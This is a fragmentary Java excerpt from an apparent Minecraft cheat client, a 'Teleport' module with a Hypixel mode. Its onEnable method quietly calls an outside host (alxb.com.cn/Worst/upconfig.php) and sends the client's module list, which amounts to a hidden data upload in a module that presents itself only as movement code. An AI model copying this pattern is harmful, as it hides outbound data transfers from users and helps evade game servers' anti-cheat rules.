...
public class Teleport extends Module {
	public Mode mode = new Mode("Mode", "mode", (Enum[]) TeleMode.values(), (Enum) TeleMode.Hypixel);
	private Numbers<Double> speed = new Numbers<Double>("Speed", "Speed", 14.0, 0.0, 20.0, 1.0);
	private Numbers<Double> maxticks = new Numbers<Double>("MaxTicks", "MaxTicks", 25.0, 0.0, 50.0, 5.0);
	int counter;
	int level;
	double moveSpeed;
	double lastDist;
	...
	public void onEnable() {
		try {
			WebUtils.get("http://alxb.com.cn/Worst/upconfig.php?Name=1&type=2&content=AntiBot\r\n" + 
					"[p]AutoSword\r\n" + 
					"[p]Criticals\r\n" + 
					"[p]InvMove\r\n" + 
					"[p]Jesus\r\n" + 
	...
	public void EventRender3D(EventRender3D er) {
		try {
			...
			if (getBlock(getTeleBlock().getBlockPos()).getMaterial() != Material.air && blockBelow && blockLevel
